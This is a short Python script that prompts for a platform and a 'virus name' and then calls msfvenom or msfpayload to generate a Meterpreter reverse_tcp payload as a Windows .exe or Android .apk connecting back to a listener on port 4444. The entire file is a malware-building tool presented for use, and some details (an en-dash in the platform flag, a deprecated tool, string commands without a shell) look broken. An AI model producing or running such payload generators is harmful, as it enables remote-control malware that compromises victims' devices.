import subprocess
platform = input('Enter the Platform(windows/android): ')
virusname = input('Enter the Virus Name: ')
if platform == "windows":
    subprocess.call('msfvenom -p windows/meterpreter/reverse_tcp -a x86 –platform windows -f exe LHOST=127.0.0.1 LPORT=4444 -o {payl}.exe'.format(payl=virusname))
if platform == "android":
    subprocess.call('msfpayload android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 R > {name}.apk'.format(name=virusname))
